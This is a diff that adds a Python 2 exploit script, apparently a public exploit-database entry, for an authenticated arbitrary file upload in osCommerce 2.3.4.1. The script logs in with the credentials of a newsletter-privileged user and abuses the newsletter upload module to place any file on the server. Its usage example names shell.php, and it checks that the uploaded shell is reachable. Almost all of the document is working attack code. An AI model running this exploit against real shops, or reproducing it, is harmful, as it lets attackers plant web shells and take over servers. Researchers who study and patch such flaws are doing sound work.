@@ -1,0 +1,119 @@
+# Exploit Title: osCommerce 2.3.4.1 Authenticated Arbitrary File Upload
+# Date: 11.11.2017
+# Exploit Author: Simon Scannell - https://scannell-infosec.net <contact@scannell-infosec.net>
+# Vendor Homepage: https://www.oscommerce.com/
+# Software Link: https://www.oscommerce.com/Products&Download=oscom234
+# Version: 2.3.4.1, 2.3.4 - Other versions have not been tested but are likely to be vulnerable
+# Tested on: Linux, Windows
+
+"""
+osCommerce does by default not allow Users to upload arbitrary files from the Admin Panel. However, any user
+being privileged enough to send newsletters can exploit an objection injection in the osCommerce core to
+upload any file, allowing the user to gain shell access. The user does not need to be an administrator,
+any account with access to the newsletters will do.
+More details can be found here:
+    https://scannell-infosec.net/uploading-a-shell-from-within-the-oscommerce-admin-panel-via-object-injection/
+"""
+
+import urlparse
+import argparse
+import sys
+import requests
+
+
+DEFAULT_ADMIN_URL = "/catalog/admin/"
+DEFAULT_NEWSLETTER_SCRIPT = "/catalog/admin/newsletters.php"
+
+
+# Builds an authenticated session and returns it if it was successful
+def authenticate(username, password, url):
+    # Build the Session and grab the inital cookie
+    session = requests.Session()
+    session.get(url + "login.php", allow_redirects=False)
+
+    get_params = {'action': "process"}
+    data = {"username": username, "password": password}
+
+    # Attempt the authentication
+    r = session.post(url + "login.php", data=data, params=get_params, allow_redirects=False)
+
+    if r.status_code == 302:
+        return session
+    else:
+        return False
+
+
+def upload_file(local_filename, session, url):
+    newsletter_script = url + "newsletters.php"
+    r = session.get(newsletter_script, params={"action": "new"})
+
+    payload = {
+        'module': 'upload',
+        'title': 'uploaded_fname',
+        'content': './'
+    }
+
+    # Create the vulnerable newsletter and grab its ID
+    r = session.post(newsletter_script, params={"action": "insert"}, data=payload, allow_redirects=False)
+    try:
+        newsletter_id = urlparse.urlparse(r.headers['Location']).query[4:]
+        print "[+] Successfully prepared the exploit and created a new newsletter with nID %s" % (newsletter_id)
+    except:
+        print "[-] The script wasn't able to create a new newsletter"
+        exit(1)
+
+    # Now lock the newsletter
+    r = session.post(newsletter_script, params={"action": "lock", "nID": newsletter_id})
+    print "[+] Successfully locked the newsletter. Now attempting to upload.."
+
+    # Send the final request, containing the file!
+    files = {
+        'uploaded_fname': open(local_filename)
+    }
+    r = session.post(newsletter_script, params={"action": "send", "nID": newsletter_id}, files=files)
+
+    print "[*] Now trying to verify that the file %s uploaded.." % (local_filename)
+
+    shell_url = url + local_filename
+    r = requests.get(shell_url)
+    print "[+] Got a HTTP 200 Reply for the uploaded file!"
+    print "[+] The uploaded file should now be available at %s" % (shell_url)
+
+
+
+# Main Routine starts here
+
+usage = " %s -u TARGET_URL -a AUTH -f FILE [-p ADMIN_PATH]\n\n" \
+        "Example: %s -u http://localhost/path/to/osCommerce --auth=admin:admin_password -f shell.php\n\n" \
+        "NOTE: For a more detailed description on the arguments use the -h switch\n\n\n" % (sys.argv[0], sys.argv[0])
+
+
+parser = argparse.ArgumentParser(description='\n\nosCommerce 2.3.4 Authenticated Arbitrary File Upload', usage=usage)
+parser.add_argument('-u', '--target-url', help='The target URL, including the path to the osCommerce installation (can also be document root /)', required=True)
+parser.add_argument('-a', '--auth', help='Credentials for a privileged user in the format of username:password', required=True)
+parser.add_argument('-f', '--file', help="The local file to be uploaded to the vulnerable webhost", required=True)
+parser.add_argument('-p', '--admin-path', help="The path for the osCommerce Admin Area. This defaults to /catalog/admin/", required=False)
+args = parser.parse_args()
+
+# Parse username and password
+username = args.auth.split(":")[0]
+password = args.auth.split(":")[1]
+
+
+url = args.target_url
+# If the user hasn't passed a path to the osCommerce Admin Panel, use the default
+if not args.admin_path:
+    url += DEFAULT_ADMIN_URL
+else:
+    url += args.admin_path
+
+# Authenticate the user and establish the connection
+session = authenticate(username, password, url)
+
+if not session:
+    print "[-] The script wasn't able to authenticate itself to osCommerce. Are you sure that the credentials are correct? Is %s the Admin Path?" % (url + "login.php")
+    exit(1)
+else:
+    print "[+] Authentication successful"
+
+upload_file(args.file, session, url)
